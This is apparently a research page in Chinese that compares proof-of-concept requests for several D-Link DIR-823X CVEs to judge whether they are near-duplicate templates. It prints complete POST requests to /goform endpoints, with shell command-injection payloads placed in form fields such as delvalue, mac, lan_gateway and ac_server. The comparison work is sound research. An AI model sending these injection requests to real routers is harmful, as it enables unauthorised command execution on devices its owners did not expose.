---
layout: default
permalink: /DIR-823X.html
title: DIR-823X PoC 大块彩色对照
date: 2026-09-15
firmware: DIR-823X
source_note: "../../DIR-823X.md"
tags:
  - IoT漏洞挖掘
  - CVE
  - PoC相似性
---

# DIR-823X PoC 大块彩色对照

> [!info] 设备与版本
> D-Link DIR-823X 基准版本包括 240126、240802、250416；CVE-2026-1544 仅影响厂商已停止维护的产品（EOL）。


<span style="color:#17803d;font-weight:700">绿色文字/边框：请求骨架和原始 PoC 来源高度一致。</span>　<span style="color:#c2410c;font-weight:700">橙色文字标注：字段、接口或命令边界的原始变化。</span>

## <span style="color:#b91c1c">A 级：CVE-2025-11095 ↔ CVE-2025-11097</span>

<table style="width:100%;table-layout:fixed;border-collapse:separate;border-spacing:10px;">
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2025-11095</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://github.com/n1ptune/dink/blob/main/delete_offline_device.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11095" target="_blank">NVD ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /goform/<span style="color:#c2410c;font-weight:700">delete_offline_device</span> HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;</span>
<span style="color:#17803d">Content-Length: &lt;按实际表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d"><span style="color:#c2410c;font-weight:700">delvalue=%27</span>+%3B+ls+%2F+%3E+%2Ftmp%2Fls.log+%23&amp;token=&lt;TOKEN&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化：接口是 delete_offline_device；字段是 delvalue。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2025-11097</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://github.com/n1ptune/dink/blob/main/set_device_name.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11097" target="_blank">NVD ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /goform/<span style="color:#c2410c;font-weight:700">set_device_name</span> HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;</span>
<span style="color:#17803d">Content-Length: &lt;按实际表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d"><span style="color:#c2410c;font-weight:700">mac=%27</span>+%3B+ls+%2F+%3E+%2Ftmp%2Fls.log+%23&amp;token=&lt;TOKEN&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化：接口是 set_device_name；字段是 mac。</div>
</td>
</tr>
</table>

<span style="color:#b91c1c;font-weight:700">判定：载荷逐字相同，只把同一字符串从 delvalue 换到 mac，属于几乎完全重复的 PoC 模板。</span>

来源：[CVE-2025-11095 原始请求](#CVE-2025-11095)、[CVE-2025-11097 原始请求](#CVE-2025-11097)。

## <span style="color:#c2410c">B 级：CVE-2025-11095 ↔ CVE-2025-11099</span>

<table style="width:100%;table-layout:fixed;border-collapse:separate;border-spacing:10px;">
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #c2410c;background:#fffaf5;padding:12px;">
<strong>CVE-2025-11095</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://github.com/n1ptune/dink/blob/main/delete_offline_device.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11095" target="_blank">NVD ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /goform/<span style="color:#c2410c;font-weight:700">delete_offline_device</span> HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;</span>
<span style="color:#17803d">Content-Length: &lt;按实际表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d"><span style="color:#c2410c;font-weight:700">delvalue=%27</span>+%3B+ls+%2F+%3E+%2Ftmp%2Fls.log+%23&amp;token=&lt;TOKEN&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">公共重点：delvalue 字段、删除类 goform、命令写入日志。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #c2410c;background:#fffaf5;padding:12px;">
<strong>CVE-2025-11099</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://github.com/n1ptune/dink/blob/main/uci_del_in_delete_prohibiting.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11099" target="_blank">NVD ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /goform/<span style="color:#c2410c;font-weight:700">delete_prohibiting</span> HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;</span>
<span style="color:#17803d">Content-Length: &lt;按实际表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d"><span style="color:#c2410c;font-weight:700">delvalue=%7C%7C</span>+ls+%23&amp;token=&lt;TOKEN&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化：接口是 delete_prohibiting；载荷边界从 ' ; … # 变为 || ls #。</div>
</td>
</tr>
</table>

<span style="color:#c2410c;font-weight:700">判定：同字段、同删除类接口和同命令注入目的，属于明显相似的边界变体；没有把它标成逐字相同。</span>

来源：[CVE-2025-11095 原始请求](#CVE-2025-11095)、[CVE-2025-11099 原始请求](#CVE-2025-11099)。

## <span style="color:#b91c1c">A 级：CVE-2026-1544 ↔ CVE-2026-2063</span>

<table style="width:100%;table-layout:fixed;border-collapse:separate;border-spacing:10px;">
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2026-1544</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://github.com/master-abc/cve/issues/16" target="_blank">master-abc/cve Issue 16 ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1544" target="_blank">NVD ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /goform/<span style="color:#c2410c;font-weight:700">set_mode</span> HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;</span>
<span style="color:#17803d">Content-Length: &lt;按实际表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d"><span style="color:#c2410c;font-weight:700">modeSelection</span>=0&amp;proto=dhcp&amp;lan_ipaddr=192.168.1.1&amp;lan_netmask=255.255.255.0&amp;<span style="color:#c2410c;font-weight:700">lan_gateway</span>=192.168.1.1%22%0Asleep+3%0Aecho+%22&amp;set_flag=0&amp;token=&lt;TOKEN&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化：接口 set_mode；注入字段 lan_gateway。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2026-2063</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://github.com/master-abc/cve/issues/19" target="_blank">master-abc/cve Issue 19 ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2063" target="_blank">NVD ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /goform/<span style="color:#c2410c;font-weight:700">set_ac_server</span> HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;</span>
<span style="color:#17803d">Content-Length: &lt;按实际表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d"><span style="color:#c2410c;font-weight:700">ac_server_mode</span>=0&amp;<span style="color:#c2410c;font-weight:700">ac_server</span>=192.168.1.1%22%0Asleep+3%0Aecho+%22&amp;token=&lt;TOKEN&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化：接口 set_ac_server；注入字段 ac_server。</div>
</td>
</tr>
</table>

<span style="color:#b91c1c;font-weight:700">判定：时间型载荷 `192.168.1.1&quot; 换行 sleep 3 换行 echo &quot;` 逐字一致，只迁移到另一个配置字段。</span>

来源：[CVE-2026-1544 原始请求](#CVE-2026-1544)、[CVE-2026-2063 原始请求](#CVE-2026-2063)。
